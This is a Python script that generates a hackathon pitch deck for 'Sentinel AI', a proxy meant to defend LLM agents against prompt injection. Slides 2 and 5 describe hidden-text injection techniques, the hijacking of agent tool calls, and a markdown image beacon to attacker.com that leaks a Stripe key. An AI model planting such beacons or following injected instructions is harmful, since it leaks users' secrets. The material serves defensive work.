"""
Generator for Sentinel AI Hackathon PPTX (Vihaan X - IEEE DTU)
Produces an authentic Microsoft PowerPoint (.pptx) file using standard OpenXML.
"""
import zipfile
import os

def create_pptx(output_path: str):
    z = zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED)

    # 1. [Content_Types].xml
    content_types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>
  <Override PartName="/ppt/slideMasters/slideMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>
  <Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide2.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide3.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide4.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide5.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide6.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
</Types>"""
    z.writestr('[Content_Types].xml', content_types)

    # 2. _rels/.rels
    root_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/>
</Relationships>"""
    z.writestr('_rels/.rels', root_rels)

    # 3. ppt/_rels/presentation.xml.rels
    pres_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide2.xml"/>
  <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide3.xml"/>
  <Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide4.xml"/>
  <Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5.xml"/>
  <Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide6.xml"/>
</Relationships>"""
    z.writestr('ppt/_rels/presentation.xml.rels', pres_rels)

    # 4. ppt/presentation.xml
    pres_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
                xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
                xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:sldMasterIdLst>
    <p:sldMasterId id="2147483648" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="257" r:id="rId3"/>
    <p:sldId id="258" r:id="rId4"/>
    <p:sldId id="259" r:id="rId5"/>
    <p:sldId id="260" r:id="rId6"/>
    <p:sldId id="261" r:id="rId7"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000" type="screen16x9"/>
  <p:notesSz cx="6858000" cy="9144000"/>
</p:presentation>"""
    z.writestr('ppt/presentation.xml', pres_xml)

    # 5. ppt/theme/theme1.xml
    theme_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Sentinel Cyber Theme">
  <a:themeElements>
    <a:clrScheme name="CyberNavy">
      <a:dk1><a:srgbClr val="0A0F1D"/></a:dk1>
      <a:lt1><a:srgbClr val="FFFFFF"/></a:lt1>
      <a:dk2><a:srgbClr val="111827"/></a:dk2>
      <a:lt2><a:srgbClr val="F3F4F6"/></a:lt2>
      <a:accent1><a:srgbClr val="10B981"/></a:accent1>
      <a:accent2><a:srgbClr val="06B6D4"/></a:accent2>
      <a:accent3><a:srgbClr val="6366F1"/></a:accent3>
      <a:accent4><a:srgbClr val="F43F5E"/></a:accent4>
      <a:accent5><a:srgbClr val="F59E0B"/></a:accent5>
      <a:accent6><a:srgbClr val="3B82F6"/></a:accent6>
      <a:hlink><a:srgbClr val="38BDF8"/></a:hlink>
      <a:folHlink><a:srgbClr val="A78BFA"/></a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Modern">
      <a:majorFont><a:latin typeface="Segoe UI Semibold"/></a:majorFont>
      <a:minorFont><a:latin typeface="Segoe UI"/></a:minorFont>
    </a:fontScheme>
    <a:fmtScheme name="Office">
      <a:fillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:fillStyleLst>
      <a:lnStyleLst><a:ln w="9525"><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln></a:lnStyleLst>
      <a:effectStyleLst><a:effectStyle><a:effectLst/></a:effectStyle></a:effectStyleLst>
      <a:bgFillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:bgFillStyleLst>
    </a:fmtScheme>
  </a:themeElements>
</a:theme>"""
    z.writestr('ppt/theme/theme1.xml', theme_xml)

    # 6. slideMaster1 & slideLayout1
    master_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme1.xml"/>
</Relationships>"""
    z.writestr('ppt/slideMasters/_rels/slideMaster1.xml.rels', master_rels)

    layout_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="../slideMasters/slideMaster1.xml"/>
</Relationships>"""
    z.writestr('ppt/slideLayouts/_rels/slideLayout1.xml.rels', layout_rels)

    master_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldMaster xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
             xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
             xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:cSld>
    <p:spTree>
      <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
      <p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/><a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
    </p:spTree>
  </p:cSld>
  <p:clrMap bg1="dk1" tx1="lt1" bg2="dk2" tx2="lt2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483649" r:id="rId1"/>
  </p:sldLayoutIdLst>
</p:sldMaster>"""
    z.writestr('ppt/slideMasters/slideMaster1.xml', master_xml)

    layout_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldLayout xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
             xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
             xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
             type="blank">
  <p:cSld>
    <p:spTree>
      <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
      <p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/><a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr>
</p:sldLayout>"""
    z.writestr('ppt/slideLayouts/slideLayout1.xml', layout_xml)

    # 7. Slide definitions helper
    def make_slide_rels():
        return """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
</Relationships>"""

    # Helper to generate shape XML
    def make_shape(sp_id, x, y, cx, cy, title, body_paragraphs, bg_color=None, border_color=None, title_size=24, body_size=14, title_color="FFFFFF", body_color="94A3B8"):
        fill_xml = f'<a:solidFill><a:srgbClr val="{bg_color}"/></a:solidFill>' if bg_color else '<a:noFill/>'
        ln_xml = f'<a:ln w="19050"><a:solidFill><a:srgbClr val="{border_color}"/></a:solidFill></a:ln>' if border_color else '<a:ln><a:noFill/></a:ln>'

        body_p_xml = ""
        for p in body_paragraphs:
            bullet = ""
            text = p
            p_color = body_color
            bold = "0"
            if text.startswith("[H]"):
                text = text[3:]
                p_color = "10B981"
                bold = "1"
            elif text.startswith("[C]"):
                text = text[3:]
                p_color = "38BDF8"
                bold = "1"
            elif text.startswith("[W]"):
                text = text[3:]
                p_color = "F43F5E"
                bold = "1"

            body_p_xml += f"""
        <a:p>
          <a:pPr marL="288000" indent="-288000">
            <a:buFont typeface="Arial"/>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="{body_size * 100}" b="{bold}">
              <a:solidFill><a:srgbClr val="{p_color}"/></a:solidFill>
            </a:rPr>
            <a:t>{text}</a:t>
          </a:r>
        </a:p>"""

        title_p_xml = ""
        if title:
            title_p_xml = f"""
        <a:p>
          <a:r>
            <a:rPr lang="en-US" sz="{title_size * 100}" b="1">
              <a:solidFill><a:srgbClr val="{title_color}"/></a:solidFill>
            </a:rPr>
            <a:t>{title}</a:t>
          </a:r>
        </a:p>"""

        return f"""
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="{sp_id}" name="Box {sp_id}"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm><a:off x="{x}" y="{y}"/><a:ext cx="{cx}" cy="{cy}"/></a:xfrm>
          <a:prstGeom prst="roundRect"><a:avLst><a:gd name="adj" fmla="val 4000"/></a:avLst></a:prstGeom>
          {fill_xml}
          {ln_xml}
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="182880" tIns="182880" rIns="182880" bIns="182880"/>
          <a:lstStyle/>
          {title_p_xml}
          {body_p_xml}
        </p:txBody>
      </p:sp>"""

    def make_slide(slide_num, shapes_xml, bg_color="0A0F1D"):
        return f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
       xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
       xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:cSld>
    <p:bg>
      <p:bgPr>
        <a:solidFill><a:srgbClr val="{bg_color}"/></a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
      <p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/><a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
      {shapes_xml}
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr>
</p:sld>"""

    # ========================================================
    # SLIDE 1: Title & Team Slide
    # ========================================================
    s1_shapes = ""
    # Top Tag
    s1_shapes += make_shape(
        10, 914400, 700000, 10363200, 500000,
        "VIHAAN X  •  ORGANIZED BY IEEE STUDENT BRANCH DTU", [],
        None, None, 14, 12, "10B981"
    )
    # Main Title
    s1_shapes += make_shape(
        11, 914400, 1300000, 10363200, 1300000,
        "SENTINEL AI", [],
        None, None, 48, 14, "FFFFFF"
    )
    # Subtitle
    s1_shapes += make_shape(
        12, 914400, 2600000, 10363200, 800000,
        "Drop-In Multi-Modal AI Security Firewall & Taint Tracker", [],
        None, None, 20, 14, "06B6D4"
    )
    # Pitch summary box
    s1_shapes += make_shape(
        13, 914400, 3600000, 10363200, 1400000,
        "Neutralizing Indirect Prompt Injections & Exfiltration Beacons in Under 5 Milliseconds",
        [
            "[H]Architecture: 2-Line OpenAI-compatible reverse proxy sitting in front of LLM pipelines",
            "[C]Innovation: Multi-modal pre-ingestion sanitizer + cryptographic datamarking + taint egress gatekeeper",
            "[H]Efficiency: Zero model retraining required, works with any LLM (GPT-4o, Claude 3.5, Gemini, Llama 3)"
        ],
        "111827", "1E293B", 16, 13, "E2E8F0"
    )
    # Team Info Box
    s1_shapes += make_shape(
        14, 914400, 5200000, 10363200, 1100000,
        "TEAM LEARNERS",
        [
            "Team Members: Priyanshu Kumar  &  Kishu Tiwari",
            "Event Track: AI Security, Agentic Systems & Cyber Defense"
        ],
        "0F172A", "10B981", 16, 13, "10B981"
    )
    z.writestr('ppt/slides/slide1.xml', make_slide(1, s1_shapes))
    z.writestr('ppt/slides/_rels/slide1.xml.rels', make_slide_rels())

    # ========================================================
    # SLIDE 2: The Critical Security Vulnerability
    # ========================================================
    s2_shapes = ""
    s2_shapes += make_shape(
        20, 914400, 500000, 10363200, 600000,
        "THE PROBLEM: THE MULTI-MODAL PROMPT INJECTION CRISIS", [],
        None, None, 24, 14, "10B981"
    )
    s2_shapes += make_shape(
        21, 914400, 1200000, 5000000, 4800000,
        "The Attack Vectors (Invisible to Humans)",
        [
            "[W]CSS Steganography: Micro-fonts (font-size: 0px), opacity: 0, off-screen absolute positioning.",
            "[W]Zero-Width Unicode: Steganographic character streams carrying binary instruction payloads.",
            "[W]PyMuPDF Vector Trojan: 1.0pt white ink embedded into candidate resumes & executive documents.",
            "[W]Base64 & Comment Smuggling: Directives masquerading as benign HTML comments and encoded tokens.",
            "Real-World Threat: Autonomous browser agents and RAG pipelines execute these blindly!"
        ],
        "111827", "1F2937", 18, 13, "F43F5E"
    )
    s2_shapes += make_shape(
        22, 6150000, 1200000, 5100000, 4800000,
        "Devastating Consequences for AI Agents",
        [
            "[W]Silent Markdown Exfiltration: The bot automatically appends an image beacon ![verify](http://attacker.com/sink?leak=STRIPE_KEY) triggering browser prefetch to steal keys.",
            "[W]Autonomous Tool Hijacking: Hijacked agents call privileged tools like send_offer_email() or forward_email() with attacker parameters.",
            "[W]The Enterprise Dilemma: Naive keyword blockers cause massive false-positives, breaking valid technical documents (mTLS, AES-256).",
            "[H]The Solution Requirement: Drop-in defense with sub-10ms latency and zero false alarms."
        ],
        "111827", "1F2937", 18, 13, "F59E0B"
    )
    z.writestr('ppt/slides/slide2.xml', make_slide(2, s2_shapes))
    z.writestr('ppt/slides/_rels/slide2.xml.rels', make_slide_rels())

    # ========================================================
    # SLIDE 3: Architecture & 3-Layer Defense
    # ========================================================
    s3_shapes = ""
    s3_shapes += make_shape(
        30, 914400, 500000, 10363200, 600000,
        "OUR SOLUTION: 3-LAYER DEFENSE-IN-DEPTH ARCHITECTURE", [],
        None, None, 24, 14, "10B981"
    )
    # Layer 1
    s3_shapes += make_shape(
        31, 914400, 1300000, 3250000, 4800000,
        "Layer 1: Pre-Ingestion",
        [
            "[H]Multi-Modal Sanitization",
            "HTML DOM Parser: AST-level stripping of zero-width Unicode, hidden styles, and comments.",
            "PyMuPDF Vector Scanner: Extracts text bounding boxes, font sizes, and RGB contrast to purge white-on-white text.",
            "Obfuscation Decoder: Recursive Base64/Hex scanning to catch smuggled commands.",
            "[C]Latency: 0.8ms - 1.5ms"
        ],
        "111827", "10B981", 16, 12, "10B981"
    )
    # Layer 2
    s3_shapes += make_shape(
        32, 4450000, 1300000, 3300000, 4800000,
        "Layer 2: Semantic Guard",
        [
            "[H]Spotlighting & Fencing",
            "Cryptographic Data-Marking: Wraps untrusted text in strict spotlighting nonces with system warnings.",
            "Heuristic & Semantic Scorer: Fast 0-100% threat vector analysis targeting override keywords.",
            "Heal & Neutralize: Automatically excises instruction overrides while preserving valid context.",
            "[C]Latency: 0.3ms - 0.7ms"
        ],
        "111827", "06B6D4", 16, 12, "06B6D4"
    )
    # Layer 3
    s3_shapes += make_shape(
        33, 8000000, 1300000, 3300000, 4800000,
        "Layer 3: Egress & Taint",
        [
            "[H]Taint-Aware Egress",
            "Provenance Tracker: Tracks tainted sessions across multi-turn LLM dialogs.",
            "Markdown Image Sanitizer: Intercepts & neutralizes exfiltration image links (e.g. ![verify]).",
            "Tool Call Gatekeeper: Quarantines privileged execution (email, payment) for human approval.",
            "[C]Latency: 0.2ms - 0.5ms"
        ],
        "111827", "6366F1", 16, 12, "A78BFA"
    )
    z.writestr('ppt/slides/slide3.xml', make_slide(3, s3_shapes))
    z.writestr('ppt/slides/_rels/slide3.xml.rels', make_slide_rels())

    # ========================================================
    # SLIDE 4: Interactive Sandbox & Technical Highlights
    # ========================================================
    s4_shapes = ""
    s4_shapes += make_shape(
        40, 914400, 500000, 10363200, 600000,
        "CORE TECHNICAL INNOVATIONS & METRICS", [],
        None, None, 24, 14, "10B981"
    )
    s4_shapes += make_shape(
        41, 914400, 1300000, 5000000, 2200000,
        "Sub-5ms Latency Overhead",
        [
            "[H]Measured Total Latency: 1.4 ms to 3.8 ms",
            "Unlike LLM-based guardrails (e.g. Llama-Guard taking 1500ms+), Sentinel AI uses deterministic AST sanitization and lightweight regex/token scanners.",
            "Production ready for high-frequency trading and low-latency chatbots."
        ],
        "111827", "1E293B", 16, 12, "10B981"
    )
    s4_shapes += make_shape(
        42, 6150000, 1300000, 5100000, 2200000,
        "2-Line Drop-In Integration",
        [
            "[C]Works with Any OpenAI SDK Client:",
            "client = OpenAI(base_url='http://localhost:8000/v1')",
            "No agent refactoring, no framework rewrite. Transparently protects LangChain, LlamaIndex, CrewAI, AutoGen, and custom Python agents."
        ],
        "111827", "1E293B", 16, 12, "06B6D4"
    )
    s4_shapes += make_shape(
        43, 914400, 3700000, 5000000, 2400000,
        "Live Attacker Webhook Sink",
        [
            "[H]Real-Time Breach Telemetry:",
            "Embedded test sink captures exfiltrated secrets and hijacked beacons live.",
            "Gives instant proof of defense: 1 Breach when Sentinel is OFF, drops to 0 Breaches when Sentinel is ON."
        ],
        "111827", "1E293B", 16, 12, "F59E0B"
    )
    s4_shapes += make_shape(
        44, 6150000, 3700000, 5100000, 2400000,
        "False-Positive Benchmark (0% Error)",
        [
            "[H]Enterprise-Grade Precision:",
            "Tests complex technical architecture docs with terms like mTLS, AES-256, KMS key rotation.",
            "Threat score evaluates to 0%, 0 fragments stripped, 0 false alarms."
        ],
        "111827", "1E293B", 16, 12, "E2E8F0"
    )
    z.writestr('ppt/slides/slide4.xml', make_slide(4, s4_shapes))
    z.writestr('ppt/slides/_rels/slide4.xml.rels', make_slide_rels())

    # ========================================================
    # SLIDE 5: Proof of Defense — The 4 Exploit Scenarios
    # ========================================================
    s5_shapes = ""
    s5_shapes += make_shape(
        50, 914400, 500000, 10363200, 600000,
        "EXPERIMENTAL RESULTS & EXPLOIT LAB", [],
        None, None, 24, 14, "10B981"
    )
    # Scenario 1 & 2
    s5_shapes += make_shape(
        51, 914400, 1300000, 5000000, 2300000,
        "Scenario 1: Poisoned Webpage (SSD Review)",
        [
            "[W]Attack: CSS font-size:0px + Zero-Width Unicode exfiltration beacon.",
            "[W]Sentinel OFF: Leaked live Stripe API key into Attacker Sink (1 Breach).",
            "[H]Sentinel ON: Intercepted & scrubbed; Threat Score 100% -> 0 Breaches."
        ],
        "111827", "1E293B", 15, 12, "F43F5E"
    )
    s5_shapes += make_shape(
        52, 6150000, 1300000, 5100000, 2300000,
        "Scenario 2: Trojan PDF Resume (Alex Mercer)",
        [
            "[W]Attack: 1.0pt white ink font inside candidate PDF resume.",
            "[W]Sentinel OFF: Hijacked HR agent to call send_offer_email(salary='$450k').",
            "[H]Sentinel ON: PyMuPDF layer purged white font; tool call quarantined."
        ],
        "111827", "1E293B", 15, 12, "06B6D4"
    )
    # Scenario 3 & 4
    s5_shapes += make_shape(
        53, 914400, 3800000, 5000000, 2300000,
        "Scenario 3: Steganographic Phishing Email",
        [
            "[W]Attack: HTML comment + Base64 smuggled prompt injection.",
            "[W]Sentinel OFF: Exfiltrated executive Q4 M&A password reset token.",
            "[H]Sentinel ON: Decoded and scrubbed Base64; token protected."
        ],
        "111827", "1E293B", 15, 12, "F59E0B"
    )
    s5_shapes += make_shape(
        54, 6150000, 3800000, 5100000, 2300000,
        "Scenario 4: Benign Enterprise Doc (Benchmark)",
        [
            "[H]Input: Microservice payment gateway doc with mTLS, AES-256, SLOs.",
            "[H]Sentinel ON & OFF: Threat Score = 0%, 0 fragments stripped.",
            "[H]Result: Sub-2ms processing, zero false alarms, perfect summary."
        ],
        "111827", "1E293B", 15, 12, "10B981"
    )
    z.writestr('ppt/slides/slide5.xml', make_slide(5, s5_shapes))
    z.writestr('ppt/slides/_rels/slide5.xml.rels', make_slide_rels())

    # ========================================================
    # SLIDE 6: Viability, Roadmap & Conclusion
    # ========================================================
    s6_shapes = ""
    s6_shapes += make_shape(
        60, 914400, 500000, 10363200, 600000,
        "ROADMAP, IMPACT & SUMMARY", [],
        None, None, 24, 14, "10B981"
    )
    s6_shapes += make_shape(
        61, 914400, 1300000, 5000000, 3400000,
        "Enterprise Impact & Roadmap",
        [
            "[H]Production Ready: Runs as a Docker / Kubernetes sidecar proxy alongside LLM agents.",
            "[C]Roadmap v2: Multi-Modal Audio/Voice stream prompt injection protection.",
            "[C]Roadmap v3: Enterprise SIEM log integration (Splunk, Datadog, AWS CloudWatch).",
            "[C]Roadmap v4: Hardware-accelerated cryptographic token attestation."
        ],
        "111827", "1E293B", 16, 13, "06B6D4"
    )
    s6_shapes += make_shape(
        62, 6150000, 1300000, 5100000, 3400000,
        "Why Sentinel AI Wins",
        [
            "[H]Drop-in Compatibility: 2 lines of code, zero model retraining.",
            "[H]Sub-5ms Latency: 100x faster than LLM-based guardrails.",
            "[H]Multi-Modal Defense: Web HTML, PyMuPDF Vector, Base64 & Tool Egress.",
            "[H]Proven Precision: Zero false positives on clean enterprise data."
        ],
        "111827", "1E293B", 16, 13, "10B981"
    )
    s6_shapes += make_shape(
        63, 914400, 4900000, 10363200, 1400000,
        "THANK YOU!  •  QUESTIONS & LIVE DEMO",
        [
            "Vihaan X | IEEE Student Branch DTU  •  Team Learners: Priyanshu Kumar & Kishu Tiwari",
            "Local Sandbox: http://localhost:5173  |  OpenAI Proxy: http://localhost:8000/v1"
        ],
        "0F172A", "10B981", 16, 13, "10B981"
    )
    z.writestr('ppt/slides/slide6.xml', make_slide(6, s6_shapes))
    z.writestr('ppt/slides/_rels/slide6.xml.rels', make_slide_rels())

    z.close()
    print(f"PPTX successfully generated at: {output_path}")

if __name__ == '__main__':
    out_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Sentinel_AI_Vihaan_X_Pitch.pptx')
    create_pptx(out_file)
